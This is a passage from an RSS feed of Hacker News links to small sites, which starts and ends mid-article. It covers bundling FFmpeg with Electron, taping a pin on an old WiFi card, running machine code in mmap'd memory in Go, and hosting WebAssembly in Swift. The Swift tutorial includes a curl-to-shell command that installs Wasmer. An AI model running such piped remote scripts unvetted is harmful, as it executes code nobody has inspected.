</span><span>[</span><span>'echo "Webpack Start"'</span><span>]</span><span>,</span><span></span></p><p><span>3</span><span>  onBuildExit</span><span>:</span><span> </span><span>[</span><span>`chmod a+x </span><span>${</span><span>path</span><span>.</span><span>resolve</span><span>(</span><span>"dist"</span><span>,</span><span> platformArchPath</span><span>,</span><span> </span><span>"ffmpeg"</span><span>)</span><span>}</span><span>`</span><span>]</span><span></span></p><p><span>4</span><span></span><span>}</span><span>)</span><span>;</span></p></pre></div><p>This command should make the files executable.</p><h2 id="moving-ffmpeg-into-electron-bundle">Moving FFmpeg into electron bundle</h2><p>Now the final step and this one is a bit weird.</p><p>Electron builder by default will not put any folder called <code>node_modules</code> inside the <code>app</code> or <code>app.asar</code> unless they are listed as <code>dependencies</code> (This is a good time to move all the dependencies to <code>dev-dependencies</code>, as they are compiled with webpack)</p><p>I was able to work around this by using <code>extraResources</code> instead of <code>files</code> in the build config (<a href="https://www.electron.build/configuration/contents.html#extraresources" target="_blank" rel="noreferrer">https://www.electron.build/configuration/contents.html#extraresources</a>).</p><p>This will put the files in the <code>Contents/Resources</code> folder for MacOS, and the <code>resources</code> folder for Linux and Windows.</p><p>As package resolution will check <code>../node_modules/</code>, this will not cause a problem and you will be able to use your app.</p><div><pre><p><span>1</span><span>extraResources"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>2</span><span>      </span><span>{</span><span></span></p><p><span>3</span><span>        </span><span>"from"</span><span>:</span><span> </span><span>"dist/node_modules/ffmpeg-static-electron/"</span><span>,</span><span></span></p><p><span>4</span><span>        </span><span>"to"</span><span>:</span><span> </span><span>"node_modules/ffmpeg-static-electron"</span><span></span></p><p><span>5</span><span>      </span><span>}</span><span></span></p><p><span>6</span><span>    </span><span>]</span></p></pre></div><p>At this point, you should be good to go with your app, and you can use <code>electron-builder --dir</code> to check and <code>electron-builder</code> to compile for the current operating system.</p><hr><p>If you want to use <a href="http://modfy.video/" target="_blank" rel="noreferrer">modfy.video</a>’s desktop app (which is currently an early alpha preview), then join our <a href="https://discord.gg/ffDZnMR" target="_blank" rel="noreferrer">discord server</a> to get access.</p><p>At the end I wanted to add, I am by no means an Electron expert. …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.modfy.video/Building-Electron-with-FFmpeg">https://blog.modfy.video/Building-Electron-with-FFmpeg</a></em></p>]]>
            </description>
            <link>https://blog.modfy.video/Building-Electron-with-FFmpeg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25722231</guid>
            <pubDate>Mon, 11 Jan 2021 00:23:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using old Mini PCIE WLAN cards in modern laptops]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25722095">thread link</a>) | @kamaraju
<br/>
January 10, 2021 | https://gsid.in/using-old-mini-pcie-wlan-cards-in-modern-laptops/ | <a href="https://web.archive.org/web/*/https://gsid.in/using-old-mini-pcie-wlan-cards-in-modern-laptops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page"><div id="content"><div id="primary"><main id="main"><article id="post-31" itemtype="https://schema.org/CreativeWork" itemscope=""><div><div itemprop="text"><figure><img width="640" height="480" src="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/dell-1501-1.jpg?resize=640%2C480&amp;ssl=1" alt="Dell 1501 half mini PCI-E 802.11n WiFi card" srcset="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/dell-1501-1.jpg?w=640&amp;ssl=1 640w, https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/dell-1501-1.jpg?resize=300%2C225&amp;ssl=1 300w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/dell-1501-1.jpg?w=640&amp;ssl=1 640w, https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/dell-1501-1.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/dell-1501-1.jpg?resize=640%2C480&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption> <br>Dell 1501 half mini PCI-E 802.11n WiFi card</figcaption></figure><p>So i was trying to install a WiFi card(Dell 1501 half mini PCI-E 802.11n card) which i had lying around from 7 years ago in my laptop. Everything worked perfectly until i tried to query the networks available. I saw that the wireless connection was turned off. I went through the usual exercise of checking the drivers, then the antenna and checking if the card was seated right in the PCI-E slot. The card would never turn on. Since it was a re-branded Broadcom chipset i tried installing the Broadcom drivers as well as the dell drivers, no dice. Then i started reading up on the Mini PCI-E specifications for the WiFi card.</p><p>Older generation of WiFi mini PCI-E cards from a while ago usually have a hardware kill switch. This RF kill switch was usually connected to one of the pins on the Mini PCI-E header. Modern laptops are unable to turn on the WLAN card. Modern laptops can read and initialize the PCI-E card, but the radio part of the card is turned off.&nbsp;</p><p>From reading up on the spec sheet of several WLAN Mini-PCIE card from 7 years ago i found that that Mini-PCIE pin 20 which according to the specs was reserved for vendor specific purposes was being utilized as a RF kill switch.Similarly in cards with WiFi and Bluetooth, pin 51 is set for Bluetooth disable along with the pin 20 for WLAN disable.</p><figure><img width="658" height="273" src="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/Mini_PCI_express.jpg?resize=658%2C273&amp;ssl=1" alt="Mini PCI Express" srcset="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/Mini_PCI_express.jpg?w=658&amp;ssl=1 658w, https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/Mini_PCI_express.jpg?resize=300%2C124&amp;ssl=1 300w" sizes="(max-width: 658px) 100vw, 658px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/Mini_PCI_express.jpg?w=658&amp;ssl=1 658w, https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/Mini_PCI_express.jpg?resize=300%2C124&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/Mini_PCI_express.jpg?resize=658%2C273&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Mini PCI Express</figcaption></figure><p> Now i have to identify the pins in my Mini PCI-E card. Luckily the mini PCI-E pins 1,2,51,52 were marked in my card. Mini PCI-E cards have the first pin on the front side and the second pin on the reverse. They alternate with odd pins on the front side of the card and the even pins on the reverse side.</p><figure><img width="399" height="350" src="https://i2.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501.jpg?resize=399%2C350&amp;ssl=1" alt="" srcset="https://i2.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501.jpg?w=399&amp;ssl=1 399w, https://i2.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501.jpg?resize=300%2C263&amp;ssl=1 300w" sizes="(max-width: 399px) 100vw, 399px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501.jpg?w=399&amp;ssl=1 399w, https://i2.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501.jpg?resize=300%2C263&amp;ssl=1 300w" data-lazy-src="https://i2.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501.jpg?resize=399%2C350&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Dell 1501 Front</figcaption></figure><figure><img width="457" height="374" src="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501-rev.jpg?resize=457%2C374&amp;ssl=1" alt="" srcset="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501-rev.jpg?w=457&amp;ssl=1 457w, https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501-rev.jpg?resize=300%2C246&amp;ssl=1 300w" sizes="(max-width: 457px) 100vw, 457px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501-rev.jpg?w=457&amp;ssl=1 457w, https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501-rev.jpg?resize=300%2C246&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/gsid.in/wp-content/uploads/2019/05/DELL1501-rev.jpg?resize=457%2C374&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure><p> So to make the card work i masked pin 20 carefully with an electrical tape to isolate it. And PCI-E card started working normally. You can use any type of tape that is non conductive. PVC tapes work best. One has to be very careful while cutting and pasting the masking as it should not mask any other pin. &nbsp;</p><figure><img src="https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?resize=567%2C567&amp;ssl=1" alt="" width="567" height="567" srcset="https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?w=756&amp;ssl=1 756w, https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?resize=150%2C150&amp;ssl=1 150w, https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?resize=300%2C300&amp;ssl=1 300w" sizes="(max-width: 567px) 100vw, 567px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?w=756&amp;ssl=1 756w, https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?resize=150%2C150&amp;ssl=1 150w, https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?resize=300%2C300&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/gsid.in/wp-content/uploads/2019/05/pin20mask.jpg?resize=567%2C567&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Pin 20 masked with Electrical tape</figcaption></figure><p>When a PCI-E pin is not connected it may start bouncing.and hence in newer PCI-E card this pin is driven with a 1 or 0 to enable or disable the card. Older generation cards just kept the pin open and hence when connected to a modern laptop without the masking think that RF is always disabled.</p><p>This has worked for me. The author cannot be held responsible for any loss or injury if you decide to follow my lead.</p></div></div></article></main></div></div></div></div>]]>
            </description>
            <link>https://gsid.in/using-old-mini-pcie-wlan-cards-in-modern-laptops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25722095</guid>
            <pubDate>Mon, 11 Jan 2021 00:11:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TV Tuner History]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25721804">thread link</a>) | @parsecs
<br/>
January 10, 2021 | https://www.maximus-randd.com/tv-tuner-history-pt5.html | <a href="https://web.archive.org/web/*/https://www.maximus-randd.com/tv-tuner-history-pt5.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.maximus-randd.com/tv-tuner-history-pt5.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25721804</guid>
            <pubDate>Sun, 10 Jan 2021 23:48:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hackers Do Wiretapping Using MitM]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25720776">thread link</a>) | @janso
<br/>
January 10, 2021 | https://www.skillonpage.com/wiretapping-using-man-in-the-middle-attack/ | <a href="https://web.archive.org/web/*/https://www.skillonpage.com/wiretapping-using-man-in-the-middle-attack/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.skillonpage.com/wiretapping-using-man-in-the-middle-attack/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25720776</guid>
            <pubDate>Sun, 10 Jan 2021 22:25:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Discovering and exploring mmap using Go]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25720731">thread link</a>) | @brunoac
<br/>
January 10, 2021 | https://brunocalza.me/2021/01/10/discovering-and-exploring-mmap-using-go/ | <a href="https://web.archive.org/web/*/https://brunocalza.me/2021/01/10/discovering-and-exploring-mmap-using-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Recently I've come to know the concept of <strong>memory-mapped files</strong> while watching a lecture of the course <a href="https://15445.courses.cs.cmu.edu/fall2019/">Intro to Database Systems</a> of <a href="https://twitter.com/andy_pavlo">Andy Pavlo</a> on database storage. One of the main problems a database storage engine has to solve is <strong>how to deal with data in disk that is bigger than the available memory</strong>. At a higher level, the main purpose of a disk-oriented storage engine is to manipulate data files in a disk. But if we assume that the data in the disk will eventually get bigger than the available memory, we cannot simply load the whole data file into memory, do the change, and write it back to disk.</p><p>This is not a new problem in Computer Science. When operational systems were being developed in the early 1960s, a similar problem was faced: <strong>how can we run programs stored in disk that are larger than the available memory?</strong> A solution to this problem was made by a group in Manchester, implemented on the <a href="https://en.wikipedia.org/wiki/Atlas_(computer)">Atlas Computer</a>, in 1961. It was called <em>virtual memory</em>. The <em>virtual memory</em> gives a running program the illusion that it has big enough memory, despite the fact that the computer does not have enough.</p><p>We are not going to go deep on how <em>virtual memory</em> works. Just have in mind that when a program is accessing memory it is accessing the <em>virtual memory</em>. And maybe the data the program is trying to access is not actually in memory, but it does not matter. The operational system will make pretend that it is by going to disk, and putting it there, and replace an old chunk of memory that is not going to be used.</p><p>So, one of the ways a database storage engine can solve the larger than memory problem is to make use of <em>virtual memory</em> and the concept of <strong>memory-mapped files</strong>.</p><p>In Linux, we can make this use by using the system call <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a> that lets you map a file, no matter how big, directly into memory. If your program needs to manipulate the file, all it needs is to manipulate the memory. The operating system handles the writes to disk for you.</p><p>In some occasions, programmers find this method more convenient than the usual system calls: <a href="https://man7.org/linux/man-pages/man2/open.2.html">open</a>, <a href="https://man7.org/linux/man-pages/man2/read.2.html">read</a>, <a href="https://man7.org/linux/man-pages/man2/write.2.html">write</a>, <a href="https://man7.org/linux/man-pages/man2/lseek.2.html">lseek</a> and <a href="https://man7.org/linux/man-pages/man2/close.2.html">close</a>.</p><h3 id="a-simple-demonstration">A simple demonstration</h3><p>Here is a small example of how you can take advantage of this in Go using the package <a href="https://github.com/edsrzf/mmap-go">mmap-go</a>:</p><pre><code>package main

import (
	"os"
	"fmt"
	"github.com/edsrzf/mmap-go"
)

func main() {
	f, _ := os.OpenFile("./file", os.O_RDWR, 0644)
	defer f.Close()
	
	mmap, _ := mmap.Map(f, mmap.RDWR, 0 )
	defer mmap.Unmap()
	fmt.Println(string(mmap))
	
	mmap[0] = 'X'
	mmap.Flush()
}</code></pre><figure><img src="https://asciinema.org/a/pRS8PvTRHksnCVQgSOWvPBF3a.svg" alt="asciicast"></figure><p>The beauty is that we could have a much bigger file, and the solution would still work. We would not have to worry about managing memory in order to avoid it filling up.</p><h3 id="detailing-mmap-capabilites">Detailing <em>mmap</em> capabilites</h3><p>We're going to explore more <em>mmap</em> functionalities from the point of view of the API provided by <a href="https://github.com/edsrzf/mmap-go">mmap-go</a>. There are probably more features that the <a href="https://godoc.org/golang.org/x/sys/unix#Mmap">native syscall</a> provides that this library does not implement.</p><h4 id="the-prot-argument">The <code>prot</code> argument</h4><p>Here is the <code>mmap.Map</code> signature</p><pre><code>func Map(f *os.File, prot, flags int) (MMap, error) 
</code></pre><p>Let's look at <code>prot</code> first. The <code>prot</code> argument lets you specify the protection levels of your mapping: <code>RDONLY</code>, <code>RDWR</code>, <code>EXEC</code> are the options provided for <code>mmap-go</code>. These levels are pretty straightforward, <code>RDONLY</code> means you can only read from the mapping, <code>RDWR</code> means you can also write, and <code>EXEC</code> means you can execute code on that mapping. &nbsp;Here is the description of <code>prot</code> from the Linux <code>man</code>:</p><pre><code>The prot argument describes the desired memory protection of the
mapping (and must not conflict with the open mode of the file).
It is either PROT_NONE or the bitwise OR of one or more of the
following flags:

PROT_EXEC
    Pages may be executed.

PROT_READ
    Pages may be read.

PROT_WRITE
    Pages may be written.

PROT_NONE
    Pages may not be accessed.
</code></pre><p>In the <a href="https://godoc.org/golang.org/x/sys/unix">unix package</a>, those flags are: <code>unix.PROT_EXEC</code>, <code>unix.PROT_READ</code>, <code>unix.PROT_WRITE</code> and <code>unix.PROT_NONE</code>.</p><h4 id="experimenting-with-prot_exec-flag">Experimenting with <code>PROT_EXEC</code> flag</h4><p>I've become intrigued by the <code>EXEC</code> flag and wanted to see an example of how that works. I've Google and could not find any example. So I tried a search in Github by <code>PROT_EXEC</code> and found a good example in <code>C</code>: <a href="https://github.com/onesmash/MMapExecDemo">MMapExecDemo</a>. I replicated this example in <code>Go</code> using <code>mmap-go</code>.</p><p>The first step was to create a function that I wanted to be put in memory by <code>mmap</code> allocation, compile it, and get its assembly opcodes.</p><p>I created the <code>inc</code> function in <code>inc.go</code> file</p><pre><code>package inc

func inc(n int) int {
	return n + 1
}

</code></pre><p>compiled it with <code>go tool compile -S -N inc.go</code>, then got its assembly by calling <code>go tool objdump -S inc.o</code>.</p><pre><code>func inc(n int) int {
  0x22b                 48c744241000000000      MOVQ $0x0, 0x10(SP)
        return n + 1
  0x234                 488b442408              MOVQ 0x8(SP), AX
  0x239                 48ffc0                  INCQ AX
  0x23c                 4889442410              MOVQ AX, 0x10(SP)
  0x241                 c3                      RET
</code></pre><p>With this, we can build represent our function in bytes on our code</p><pre><code>code := []byte{
        0x48, 0xc7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x44, 0x24, 0x08,
		0x48, 0xff, 0xc0,
		0x48, 0x89, 0x44, 0x24, 0x10,
		0xc3,
}
</code></pre><p>We allocate our memory with <code>mmap</code>.</p><pre><code>memory, err := mmap.MapRegion(nil, len(code), mmap.EXEC|mmap.RDWR, mmap.ANON, 0)
if err != nil {
    panic(err)
}
</code></pre><p>In this call, we're using a more complete function called <code>MapRegion</code> that lets you specify how much memory you are allocating (<code>Map</code> allocates the size of the underlying file) and the offset of the file.</p><p>In the beginning, we said that the main purpose of <code>mmap</code> was to create a mapping between a file and memory. But in this call we are not indicating any file. <code>mmap</code> can be used just a regular memory allocater by setting <code>nil</code> to the <code>*os.File</code> argument and <code>mmap.ANON</code> to the <code>flags</code> argument. We will talk about more <code>mmap.ANON</code>. Since we are not mapping any file, the offset is <code>0</code>.</p><p>So we have memory allocated with the same size of our code <code>len(code)</code>. Since we set the flag <code>mmap.RDWR</code>, we can copy our <code>code</code> to <code>memory</code>.</p><pre><code>copy(memory, code)
</code></pre><p>We have the code of our <code>inc</code> function in memory. In order to execute it, we have to cast that memory address to a function with a signature that matches the signature of our compiled <code>inc</code>.</p><pre><code>memory_ptr := &amp;memory
ptr := unsafe.Pointer(&amp;memory_ptr)
inc := *(*func(int) int)(ptr)
</code></pre><p>When we call <code>inc</code>, we are executing the code we put in memory. That only works because of the flag <code>mmap.EXEC</code>. If that flag was not set, a <code>segmentation violation</code> would occur.</p><pre><code>fmt.Println(inc(10)) // Prints 11
</code></pre><p>I don't know if this is a real use case. I just wanted to see what it meant to execute code that you put in memory. And there are probably other ways of achieving the same with regular memory allocation and calls to <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">mprotect</a>.</p><p>One question that may come up is: but the code is already in the <code>code</code> variable, can't we just execute it? No, because the memory static allocated to <code>code</code> is not executable. Can we make it executable? I've tried to use <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">mprotect</a> on it but still got <code>segmentation violation</code>.</p><p>Here is the full working <a href="https://gist.github.com/brunoac/b9ff4ad46c27926e5e4f078133d0de79">gist</a>.</p><h4 id="the-flags-argument">The <code>flags</code> argument</h4><p>We can have many processes mapping the same memory region. This argument lets us decide about the visibility of the updates happening in the mapping. There are many flags, and you can check them out at <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>. The important ones are <code>unix.MAP_SHARED</code>, <code>unix.MAP_PRIVATE</code> and <code>unix.MAP_ANON</code>.</p><p><code>MAP_SHARED</code> means that changes to the mapping are visible to all processes and will also occur at the underlying mapped file, although we cannot control when.</p><p><code>MAP_PRIVATE</code> means the changes are private and other processes will not see them. And also, they are not carried through to the underlying file.</p><p><code>MAP_ANON</code> means that there is not going to be a mapped file. It is useful for sub-processes communication with shared memory.</p><p>I've got confused about the <code>mmap-go</code> library implementation. It only provides the <code>mmap.ANON</code> flag, that we used in the above example. If you want your mapping to be private, you can set the <code>mmap.COPY</code> flag to the <code>prot</code> argument. Anyways, you can always use the flags provided by the <code>unix</code> package implementation.</p><h4 id="locking-and-flushing">Locking and flushing</h4><p>Two other nice methods, <code>Lock</code> and <code>Flush</code>, are provided by the API of <code>mmap-go</code>. The <code>Lock</code> method calls the <a href="https://man7.org/linux/man-pages/man2/mlock.2.html">mlock</a> system call that prevents the mapping to be paged out to disk. And the <code>Flush</code> method calls the <a href="https://man7.org/linux/man-pages/man2/msync.2.html">msync</a> system call that forces the data in memory to be written to disk. This is a good way to trying to have more control over how and when data is flushed to disk.</p><h3 id="wrapping-up">Wrapping up</h3><p>I felt kind of stupid of knowing about <code>mmap</code> after so long. I don't remember it being brought in my college class. For some reason, I felt amazed by it and its capabilities and decided to dig deeper. I like databases and I'm aiming to get a better grasp of them. This means that <code>mmap</code> cannot go unnoticed from my learning. For future posts, I'll try to bring about the benefits and drawbacks of using <code>mmap</code>, which projects use it, and what kind of problems it is suited for.</p><p>Even though the <code>mmap</code> can be used to solve that database problem we stated in the beginning, and many modern databases use it, <a href="https://twitter.com/andy_pavlo">Andy Pavlo</a> advocates against it and have three lecture on how to databases, that don't use <code>mmap</code>, manage data.</p><p>If you like this kind of content, follow me on <a href="https://twitter.com/brunocalza">twitter</a>. You may find more related stuff there.</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://brunocalza.me/2021/01/10/discovering-and-exploring-mmap-using-go/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25720731</guid>
            <pubDate>Sun, 10 Jan 2021 22:21:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Build a wall of testimonials with videos/tweets/text. Here is mine]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25720322">thread link</a>) | @damechen
<br/>
January 10, 2021 | https://testimonial.to/testimonial/all | <a href="https://web.archive.org/web/*/https://testimonial.to/testimonial/all">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://testimonial.to/testimonial/all</link>
            <guid isPermaLink="false">hacker-news-small-sites-25720322</guid>
            <pubDate>Sun, 10 Jan 2021 21:47:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hosting WebAssembly in Swift]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25720304">thread link</a>) | @ingve
<br/>
January 10, 2021 | http://www.alwaysrightinstitute.com//swifty-wasmer/ | <a href="https://web.archive.org/web/*/http://www.alwaysrightinstitute.com//swifty-wasmer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><img src="https://avatars3.githubusercontent.com/u/44205449?s=86&amp;v=4" width="86" height="86">
Today we are going to embed and run
<a href="https://webassembly.org/">WebAssembly</a> (Wasm)
modules in a Swift program.
Using
<a href="https://wasmer.io/">Wasmer</a>,
an embeddable runtime for Wasm,
wrapped in a simple
<a href="https://github.com/AlwaysRightInstitute/SwiftyWasmer">Swift API</a>.</p>

<p>While it isn’t used that much in production just yet, 
you likely have heard about 
<a href="https://webassembly.org/">WebAssembly</a> (Wasm)
before.
The technology is most commonly known for running programs written in compiled
languages like C, Rust or <a href="https://swiftwasm.org/">Swift</a>
right within a web browser.
Sandboxed, and without any native plugins.</p>

<p>That is <strong>not</strong> what we are going to do today.
Instead of running Wasm programs inside of a web browser,
we are going to run them inside of a Swift program.</p>

<p>For the impatient among us, this is what it looks like:</p>
<div><div><pre><code><span>import</span> <span>Wasmer</span>

<span>let</span> <span>wasmData</span> <span>=</span> <span>try</span> <span>Data</span><span>(</span><span>contentsOf</span><span>:</span> <span>URL</span><span>(</span><span>fileURLWithPath</span><span>:</span> <span>"sum.wasm"</span><span>))</span>
<span>let</span> <span>module</span>   <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Module</span><span>(</span><span>wasmData</span><span>)</span>
<span>let</span> <span>instance</span> <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Instance</span><span>(</span><span>module</span><span>)</span>
<span>print</span><span>(</span><span>instance</span><span>.</span><span>exports</span><span>.</span><span>sum</span><span>(</span><span>.</span><span>i32</span><span>(</span><span>7</span><span>),</span> <span>.</span><span>i32</span><span>(</span><span>8</span><span>)))</span>
</code></pre></div></div>

<blockquote>
  <p>We are also <em>not</em> going to look at how to compile Swift itself to
WebAssembly. Checkout the <a href="https://swiftwasm.org/">SwiftWasm</a>
project for that.</p>
</blockquote>

<p>So what exactly is Wasm. We’ll look at that in more detail further down below,
but essentially a developer can compile a, say Rust, program into
a Wasm “binary”. In Rust it looks like this:</p>
<div><div><pre><code><span>$ </span>cargo build <span>--target</span> wasm32-wasi
</code></pre></div></div>
<p>The result is a <code>.wasm</code> file, for example <code>sum.wasm</code> - a Wasm binary. 
It doesn’t run natively on your host (it is built for a different platform),
but it does run within a web browser, or: using embeddable runtimes like
<a href="https://wasmer.io/">Wasmer</a>.</p>

<blockquote>
  <p>The <code>wasm32</code> in the target is like <code>x86</code> or <code>arm64</code> - the CPU architecture.
The <a href="https://wasi.dev/"><code>wasi</code></a> is more like the operating system, 
what would be <code>win32</code> or <code>linux</code> in other targets.</p>
</blockquote>

<p>But lets setup a first basic project to get a feel for the technology.</p>

<h2 id="installing-wasmer">Installing Wasmer</h2>

<p>Wasmer is pretty small and can be installed with a little script in like 30 
seconds (manual install is fine too, check the 
 <a href="https://docs.wasmer.io/">docs</a> for instructions):</p>
<div><div><pre><code><span>$ </span>curl https://get.wasmer.io <span>-sSfL</span> | sh
</code></pre></div></div>
<p>Afterwards you have the <code>wasmer</code> and <code>wapm</code> binaries (they install into
<code>~/.wasmer</code> by default).
<a href="https://wapm.io/">WAPM</a>
is a package manager like Homebrew and can be used to install and run
Wasm packages:</p>
<div><div><pre><code><span>$ </span>wapm <span>install</span> <span>-g</span> fortune
<span>[</span>INFO] Installing _/fortune@0.2.0
<span>$ </span>wapm run fortune
The most exciting phrase to hear <span>in </span>science, the one that heralds new discoveries, is not <span>"Eureka!"</span> <span>(</span>I found it!<span>)</span> but <span>"That's funny ..."</span>
    <span>--</span> Isaac Asimov
</code></pre></div></div>

<p>A more complex example, a JavaScript engine as a Wasm module: 
<a href="https://wapm.io/package/quickjs">QuickJS</a>:</p>
<div><div><pre><code><span>$ </span>wapm <span>install</span> <span>-g</span> quickjs
<span>[</span>INFO] Installing _/quickjs@0.0.3
Global package installed successfully!

<span>$ </span>wapm run qjs
QuickJS - Type <span>"</span><span>\h</span><span>"</span> <span>for </span><span>help
</span>qjs <span>&gt;</span> console.log<span>(</span><span>"hello"</span><span>)</span>
console.log<span>(</span><span>"hello"</span><span>)</span>
hello
undefined
</code></pre></div></div>

<p>Looks nice. Let’s compile a small program ourselves.</p>

<h2 id="compiling-a-rust-program">Compiling a Rust program</h2>

<p>Arguably one of the languages which (as of today) support Wasm the best
is Rust. We at the ARI think Rust is mostly wrong, but it always pays to watch
over the fence.
Since a few examples we are going to play with are in Rust, let’s install the
toolchain.</p>

<p><strong>Note</strong>: Do <em>not</em> install the <code>rust</code> Homebrew package!
Instead we are going to use <code>rustup</code>, which can install both Rust compiler/env
and the Wasm toolchain we need:</p>

<div><div><pre><code><span>$ </span>brew <span>install </span>rustup
<span>$ </span>rustup-init
<span>$ </span><span>source</span> <span>$HOME</span>/.cargo/env
<span>$ </span>rustup target add wasm32-wasi
</code></pre></div></div>

<p>That’s all required to get going with Rust. We are going to
compile the 
<a href="https://github.com/wapm-packages/cowsay"><code>cowsay</code></a>
Rust program. Into a Wasm binary. First check out the repository:</p>
<div><div><pre><code><span>$ </span>git clone https://github.com/wapm-packages/cowsay
<span>$ </span><span>cd </span>cowsay
</code></pre></div></div>
<p>Then compile it for Wasm:</p>
<div><div><pre><code><span>$ </span>cargo build <span>--target</span> wasm32-wasi <span>--release</span>
...
    Finished dev <span>[</span>unoptimized + debuginfo] target<span>(</span>s<span>)</span> <span>in </span>35.68s
</code></pre></div></div>
<p>Just like with Swift Package Manager, this will pull down and compile all the
dependencies, then the program itself.
The result can be found in the <code>target/wasm32-wasi/release</code> folder:</p>
<div><div><pre><code><span>$ </span><span>du</span> <span>-sh</span> target/wasm32-wasi/release/cowsay.wasm 
804K	target/wasm32-wasi/release/cowsay.wasm
</code></pre></div></div>

<p>We can run the module using <code>wasmer</code>:</p>
<div><div><pre><code><span>$ </span>wasmer target/wasm32-wasi/release/cowsay.wasm Swifty Cow!
 _____________
&lt; Swifty Cow! <span>&gt;</span>
 <span>-------------</span>
        <span>\ </span>  ^__^
         <span>\ </span> <span>(</span>oo<span>)</span><span>\_</span>______
